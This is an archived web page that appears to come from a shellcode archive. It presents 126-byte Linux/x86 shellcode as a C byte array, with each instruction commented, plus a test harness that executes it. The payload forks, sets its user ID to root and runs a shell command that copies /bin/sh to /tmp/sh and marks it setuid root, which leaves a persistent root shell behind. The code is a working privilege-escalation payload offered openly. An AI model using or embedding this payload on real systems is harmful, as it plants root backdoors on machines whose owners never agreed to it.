<html><head><title>Linux/x86 - hence dropping a SUID root shell in /tmp - 126 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
   linux/x86 (shamelessly ripped from one of my unpublished exploits)
*/
/*
   fork()'s, does setreuid(0, 0); then execve()'s:
     /bin/sh -c &quot;cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh&quot;
  
   hence dropping a SUID root shell in /tmp.
*/

char shellc[] =
/* Shellcode to drop a SUID root shell in /tmp/sh. 
   Forgive the Intel syntax in the commenting, bored with AT&amp;T syntax..
 */

/* main: if (fork()) goto exeunt; else goto carryon; */
&quot;\x29\xc0&quot;                                 /* sub ax, ax               */
&quot;\xb0\x02&quot;                                 /* mov al, 2                */
&quot;\xcd\x80&quot;                                 /* int 0x80                 */
&quot;\x85\xc0&quot;                                 /* test ax, ax              */
&quot;\x75\x02&quot;                                 /* jnz exeunt               */
&quot;\xeb\x05&quot;                                 /* jmp carryon              */

/* exeunt: exit(x); */
&quot;\x29\xc0&quot;                                 /* sub ax, ax               */
&quot;\x40&quot;                                     /* inc ax                   */
&quot;\xcd\x80&quot;                                 /* int 0x80                 */

/* carryon: setreuid(0, 0); goto callz; */
&quot;\x29\xc0&quot;                                 /* sub ax, ax               */
&quot;\x29\xdb&quot;                                 /* sub bx, bx               */
&quot;\x29\xc9&quot;                                 /* sub cx, cx               */
&quot;\xb0\x46&quot;                                 /* mov al, 0x46             */
&quot;\xcd\x80&quot;                                 /* int 0x80                 */
&quot;\xeb\x2a&quot;                                 /* jmp callz                */

/* start: execve() */
&quot;\x5e&quot;                                     /* pop si                   */
&quot;\x89\x76\x32&quot;                             /* mov [bp+0x32], si        */
&quot;\x8d\x5e\x08&quot;                             /* lea bx, [bp+0x08]        */
&quot;\x89\x5e\x36&quot;                             /* mov [bp+0x36], bx        */
&quot;\x8d\x5e\x0b&quot;                             /* lea bx, [bp+0x0b]        */
&quot;\x89\x5e\x3a&quot;                             /* mov [bp+0x3a], bx        */
&quot;\x29\xc0&quot;                                 /* sub ax, ax               */
&quot;\x88\x46\x07&quot;                             /* mov [bp+0x07], al        */
&quot;\x88\x46\x0a&quot;                             /* mov [bp+0x0a], al        */
&quot;\x88\x46\x31&quot;                             /* mov [bp+0x31], al        */
&quot;\x89\x46\x3e&quot;                             /* mov [bp+0x3e], ax        */
&quot;\x87\xf3&quot;                                 /* xchg si, bx              */
&quot;\xb0\x0b&quot;                                 /* mov al, 0x0b             */
&quot;\x8d\x4b\x32&quot;                             /* lea cx, [bp+di+0x32]     */
&quot;\x8d\x53\x3e&quot;                             /* lea dx, [bp+di+0x3e]     */
&quot;\xcd\x80&quot;                                 /* int 0x80                 */

/* callz: call start */
&quot;\xe8\xd1\xff\xff\xff&quot;                     /* call start               */

/* data - command to execve() */
&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f&quot;
&quot;\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34&quot;
&quot;\x37\x35\x35\x20\x2f\x74\x6d\x70\x2f\x73\x68&quot;;

/** test out the shellcode **/
main ()
{
  void (*sc)() = (void *)shellc; sc();
}


		<body><script type="text/javascript">
		var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
		document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
		</script>

		<script type="text/javascript">
		try {
		var pageTracker = _gat._getTracker("UA-6809519-1");
		pageTracker._trackPageview();
		} catch(err) {}</script></body></html>
		
